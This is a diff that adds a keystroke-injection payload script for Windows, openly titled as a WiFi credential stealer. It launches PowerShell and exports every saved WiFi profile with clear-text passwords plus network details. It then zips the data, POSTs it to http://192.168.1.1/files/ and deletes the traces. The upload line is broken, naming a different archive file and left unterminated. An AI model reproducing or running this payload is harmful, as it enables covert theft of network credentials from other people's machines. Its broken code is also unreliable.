@@ -1,0 +1,37 @@
+REM TITLE Windows HTTP Steal WiFi Credentials
+REM AUTHOR c0rgo
+REM DESCRIPTION Exports WiFi profiles with clear passwords, along with some useful info, then uploads the data via HTTP POST request.
+REM TARGET Windows
+
+REM Mandatory delay before launching payload
+DELAY 3000
+
+REM Press WIN + R = Execute dialog
+GUI r
+DELAY 1000
+
+REM Launch PowerShell
+STRINGLN powershell.exe
+DELAY 5000
+
+REM Begin exfiltration
+STRINGLN cd $Env:userprofile
+DELAY 2000
+STRINGLN mkdir tmp
+DELAY 2000
+STRINGLN ipconfig /all > ./tmp/ip_info.txt
+DELAY 2000
+STRINGLN netsh wlan export profile folder=.\\tmp key=clear
+DELAY 4500
+STRINGLN Compress-Archive -Path ./tmp -DestinationPath ./tmp/tmp_archive.zip
+DELAY 6500
+
+REM This requires PowerShell >= 7 in order to work
+STRINGLN Invoke-RestMethod -Uri 'http://192.168.1.1/files/' -Method Post -ContentType 'multipart/form-data' -Form @{'upload' = Get-Item \"./tmp/$Env:computername.zip\
+DELAY 5000
+STRINGLN del -r tmp
+DELAY 3000
+STRINGLN exit
+DELAY 500
+
+REM End of payload
